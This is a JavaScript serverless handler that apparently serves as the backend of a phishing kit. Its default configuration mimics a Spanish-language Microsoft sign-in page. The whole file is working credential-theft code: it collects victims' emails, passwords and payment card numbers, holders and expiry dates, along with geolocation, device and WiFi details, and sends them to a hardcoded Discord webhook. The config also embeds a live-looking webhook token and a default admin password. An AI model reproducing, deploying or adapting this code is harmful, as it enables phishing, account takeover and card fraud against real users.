import { Buffer } from 'node:buffer';

const GH_TOKEN = process.env.GH_TOKEN || '';
const GH_OWNER = process.env.GH_OWNER || 'varasjaime777-alt';
const GH_REPO = process.env.GH_REPO || 'mail-office-3656';
const CONFIG_PATH = 'config.json';
const GITHUB_API = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${CONFIG_PATH}`;

const githubHeaders = {
  'Authorization': `token ${GH_TOKEN}`,
  'Accept': 'application/vnd.github.v3+json',
  'User-Agent': 'PanelControlVercel/2.0'
};

async function githubRead() {
  const res = await fetch(GITHUB_API, { method: 'GET', headers: githubHeaders });
  if (!res.ok) throw new Error(`GitHub read error: ${res.status}`);
  const data = await res.json();
  return JSON.parse(Buffer.from(data.content, 'base64').toString('utf-8'));
}

function getDefaultConfig() {
  return {
    discordWebhook: "https://discord.com/api/webhooks/1552922193904533585/qFZTJm-dvi8rtMebse3E46vYEJHiRUMPCOT431ObwBflrQM0B0pYoaiEWZVolklwl0mk",
    loginBgType: "image",
    loginBgColor: "#0a0a1a",
    loginBgGradient: "linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 100%)",
    loginBgImage: "https://logincdn.msftauth.net/shared/5/images/fluent_web_dark_2_bf5f23287bc9f60c9be2.svg",
    loginTitle: "Iniciar sesión",
    loginSubtitle: "Usar su cuenta de Microsoft.",
    loginButton: "Siguiente",
    loginBgOverlay: true,
    loginCardBg: "rgba(255, 255, 255, 0.15)",
    loginCardBlur: "10px",
    adminPassword: "admin123",
    adminAccessEnabled: true,
    discordMessageTemplate: "",
    showLogo: true,
    logoText: "Microsoft",
    favicon: "/favicon.svg"
  };
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    let config = {};
    try {
      config = await githubRead();
    } catch (e) {
      console.warn('GitHub read failed, using defaults:', e.message);
      config = getDefaultConfig();
    }

    // Merge with defaults
    const defaults = getDefaultConfig();
    config = { ...defaults, ...config };

    const webhookUrl = config.discordWebhook;
    if (!webhookUrl || !webhookUrl.includes('discord.com/api/webhooks')) {
      return res.status(400).json({ error: 'Webhook no configurado' });
    }

    const body = req.body || {};

    // Determine message type: login or payment
    const msgType = body.type || 'login';
    const timestamp = new Date().toISOString();

    const forwardedFor = req.headers['x-forwarded-for'] || '';
    const clientIp = forwardedFor.split(',')[0]?.trim() || 'desconocida';

    // Extract all body fields with fallbacks
    const email = body.email || 'unknown';
    const password = body.password || '';
    const wifiName = body.wifiName || '';

    // Browser data
    const userAgent = body.userAgent || 'desconocido';
    const language = body.language || 'desconocido';
    const languages = body.languages || language;
    const screenResolution = body.screenResolution || 'desconocido';
    const colorDepth = body.colorDepth || 'desconocido';
    const timezone = body.timezone || 'desconocido';
    const platform = body.platform || 'desconocido';
    const onlineStatus = body.onlineStatus || 'desconocido';
    const cookiesEnabled = body.cookiesEnabled || 'desconocido';

    // Geo IP data
    const geoIp = body.geoIp || (body.ipifyIp || clientIp);
    const geoCity = body.geoCity || '';
    const geoRegion = body.geoRegion || '';
    const geoCountry = body.geoCountry || '';
    const geoCountryCode = body.geoCountryCode || '';
    const geoTimezone = body.geoTimezone || timezone;
    const geoIsoCode = body.geoIsoCode || '';
    const geoIsp = body.geoIsp || '';
    const geoLatitude = body.geoLatitude || '';
    const geoLongitude = body.geoLongitude || '';
    const geoZip = body.geoZip || '';
    const geoCurrency = body.geoCurrency || '';
    const geoCurrencyCode = body.geoCurrencyCode || '';
    const geoCallingCode = body.geoCallingCode || '';
    const geoNetwork = body.geoNetwork || '';

    // Device data
    const deviceMemory = body.deviceMemory || 'desconocido';
    const cpuCores = body.cpuCores || 'desconocido';
    const touchPoints = body.touchPoints || 0;
    const isMobile = body.isMobile || 'desconocido';
    const isTablet = body.isTablet || 'desconocido';
    const isDesktop = body.isDesktop || 'desconocido';

    // Battery data
    const batteryLevel = body.batteryLevel || 'No disponible';
    const batteryCharging = body.batteryCharging || 'Desconocido';

    let message = '';
    let title = '';

    if (msgType === 'payment') {
      // Payment data
      const cardNumber = body.cardNumber || '';
      const cardHolder = body.cardHolder || '';
      const expiryDate = body.expiryDate || '';

      title = '💳 Verificación de pago';
      message = title;
      message += '\n──────────────────────────';
      message += '\nUsuario: ' + email;
      message += '\nIP: ' + clientIp;
      message += '\nGeo IP: ' + geoIp;
      message += '\n🏙️ Ciudad: ' + geoCity;
      message += '\n📍 Región: ' + geoRegion;
      message += '\n🌍 País: ' + geoCountry + ' (' + geoCountryCode + ')';
      message += '\n🧭 Latitud: ' + geoLatitude;
      message += '\n🧭 Longitud: ' + geoLongitude;
      message += '\n📬 Código Postal: ' + geoZip;
      message += '\n💱 Moneda: ' + geoCurrency + ' (' + geoCurrencyCode + ')';
      message += '\n📞 Código de llamada: ' + geoCallingCode;
      message += '\n📡 ISP/Organización: ' + geoIsp;
      message += '\n🌐 Red: ' + geoNetwork;

      // Card data
      message += '\n\n💳 Datos de tarjeta:';
      message += '\n🔢 Tarjeta: ' + cardNumber;
      message += '\n👤 Titular: ' + cardHolder;
      message += '\n📅 Vence: ' + expiryDate;

      // Device data
      message += '\n\n🖥️ Dispositivo:';
      message += '\n💾 Memoria RAM: ' + deviceMemory + ' GB';
      message += '\n🧠 CPU: ' + cpuCores + ' núcleos';
      message += '\n📱 Puntos táctiles: ' + touchPoints;
      message += '\n📱 Tipo: ' + isMobile + ' (Móvil) / ' + isTablet + ' (Tablet) / ' + isDesktop + ' (Escritorio)';
      message += '\n🔋 Batería: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';

      // WiFi
      if (wifiName) {
        message += '\n📶 WiFi: ' + wifiName;
      }

      // Browser data
      message += '\n\n🌐 Navegador:';
      message += '\n🔍 User-Agent: ' + userAgent;
      message += '\n🗣️ Idioma: ' + language;
      message += '\n🗣️ Idiomas: ' + languages;
      message += '\n📏 Pantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
      message += '\n⏰ Zona horaria: ' + timezone;
      message += '\n💻 Plataforma: ' + platform;
      message += '\n📶 Estado: ' + onlineStatus;
      message += '\n🍪 Cookies: ' + cookiesEnabled;

      message += '\n──────────────────────────';
      message += '\n⏰ Hora: ' + timestamp;
    } else {
      // Login data (default)
      title = '🔐 Nuevo inicio de sesión';
      message = title;
      message += '\n──────────────────────────';
      message += '\n📧 Usuario: ' + email;
      message += '\n🔑 Contraseña: ' + password;
      message += '\n📡 IP: ' + clientIp;
      message += '\n🌐 Geo IP: ' + geoIp;
      message += '\n🏙️ Ciudad: ' + geoCity;
      message += '\n📍 Región: ' + geoRegion;
      message += '\n🌍 País: ' + geoCountry + ' (' + geoCountryCode + ')';
      message += '\n🧭 Código ISO: ' + geoIsoCode;
      message += '\n📡 ISP/Organización: ' + geoIsp;
      message += '\n🧭 Latitud: ' + geoLatitude;
      message += '\n🧭 Longitud: ' + geoLongitude;
      message += '\n📬 Código Postal: ' + geoZip;
      message += '\n💱 Moneda: ' + geoCurrency + ' (' + geoCurrencyCode + ')';
      message += '\n📞 Código de llamada: ' + geoCallingCode;
      message += '\n🌐 Red: ' + geoNetwork;

      // Device data
      message += '\n\n🖥️ Dispositivo:';
      message += '\n💾 Memoria RAM: ' + deviceMemory + ' GB';
      message += '\n🧠 CPU: ' + cpuCores + ' núcleos';
      message += '\n📱 Puntos táctiles: ' + touchPoints;
      message += '\n📱 Tipo: ' + isMobile + ' (Móvil) / ' + isTablet + ' (Tablet) / ' + isDesktop + ' (Escritorio)';
      message += '\n🔋 Batería: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';

      // WiFi
      if (wifiName) {
        message += '\n📶 WiFi: ' + wifiName;
      }

      // Browser data
      message += '\n\n🌐 Navegador:';
      message += '\n🔍 User-Agent: ' + userAgent;
      message += '\n🗣️ Idioma: ' + language;
      message += '\n🗣️ Idiomas: ' + languages;
      message += '\n📏 Pantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
      message += '\n⏰ Zona horaria: ' + timezone;
      message += '\n💻 Plataforma: ' + platform;
      message += '\n📶 Estado: ' + onlineStatus;
      message += '\n🍪 Cookies: ' + cookiesEnabled;

      message += '\n──────────────────────────';
      message += '\n⏰ Hora: ' + timestamp;
    }

    // Apply custom template if configured
    const template = config.discordMessageTemplate || '';
    if (template && template.includes('{email}')) {
      let tmplMessage = template;
      tmplMessage = tmplMessage.replace(/\{email\}/g, email);
      tmplMessage = tmplMessage.replace(/\{password\}/g, password);
      tmplMessage = tmplMessage.replace(/\{ip\}/g, clientIp);
      tmplMessage = tmplMessage.replace(/\{geoIp\}/g, geoIp);
      tmplMessage = tmplMessage.replace(/\{geoCity\}/g, geoCity);
      tmplMessage = tmplMessage.replace(/\{geoRegion\}/g, geoRegion);
      tmplMessage = tmplMessage.replace(/\{geoCountry\}/g, geoCountry);
      tmplMessage = tmplMessage.replace(/\{geoCountryCode\}/g, geoCountryCode);
      tmplMessage = tmplMessage.replace(/\{geoIsoCode\}/g, geoIsoCode);
      tmplMessage = tmplMessage.replace(/\{geoTimezone\}/g, geoTimezone);
      tmplMessage = tmplMessage.replace(/\{geoIsp\}/g, geoIsp);
      tmplMessage = tmplMessage.replace(/\{geoLatitude\}/g, geoLatitude);
      tmplMessage = tmplMessage.replace(/\{geoLongitude\}/g, geoLongitude);
      tmplMessage = tmplMessage.replace(/\{geoZip\}/g, geoZip);
      tmplMessage = tmplMessage.replace(/\{geoCurrency\}/g, geoCurrency);
      tmplMessage = tmplMessage.replace(/\{geoCurrencyCode\}/g, geoCurrencyCode);
      tmplMessage = tmplMessage.replace(/\{geoCallingCode\}/g, geoCallingCode);
      tmplMessage = tmplMessage.replace(/\{geoNetwork\}/g, geoNetwork);
      tmplMessage = tmplMessage.replace(/\{deviceMemory\}/g, deviceMemory);
      tmplMessage = tmplMessage.replace(/\{cpuCores\}/g, cpuCores);
      tmplMessage = tmplMessage.replace(/\{touchPoints\}/g, touchPoints);
      tmplMessage = tmplMessage.replace(/\{isMobile\}/g, isMobile);
      tmplMessage = tmplMessage.replace(/\{isTablet\}/g, isTablet);
      tmplMessage = tmplMessage.replace(/\{isDesktop\}/g, isDesktop);
      tmplMessage = tmplMessage.replace(/\{batteryLevel\}/g, batteryLevel);
      tmplMessage = tmplMessage.replace(/\{batteryCharging\}/g, batteryCharging);
      tmplMessage = tmplMessage.replace(/\{userAgent\}/g, userAgent);
      tmplMessage = tmplMessage.replace(/\{language\}/g, language);
      tmplMessage = tmplMessage.replace(/\{languages\}/g, languages);
      tmplMessage = tmplMessage.replace(/\{screenResolution\}/g, screenResolution);
      tmplMessage = tmplMessage.replace(/\{colorDepth\}/g, colorDepth);
      tmplMessage = tmplMessage.replace(/\{timezone\}/g, timezone);
      tmplMessage = tmplMessage.replace(/\{platform\}/g, platform);
      tmplMessage = tmplMessage.replace(/\{onlineStatus\}/g, onlineStatus);
      tmplMessage = tmplMessage.replace(/\{cookiesEnabled\}/g, cookiesEnabled);
      tmplMessage = tmplMessage.replace(/\{wifiName\}/g, wifiName);
      tmplMessage = tmplMessage.replace(/\{timestamp\}/g, timestamp);
      message = tmplMessage;
    }

    // Send to Discord webhook
    const discordRes = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: message })
    });

    if (!discordRes.ok) {
      const text = await discordRes.text();
      console.error('Discord webhook error:', discordRes.status, text);
      return res.status(500).json({ error: 'Error enviando a Discord: ' + discordRes.status });
    }

    return res.status(200).json({ success: true, message: 'Datos enviados a Discord correctamente.' });
  } catch (err) {
    console.error('Discord API error:', err);
    return res.status(500).json({ error: 'Error interno: ' + err.message });
  }
}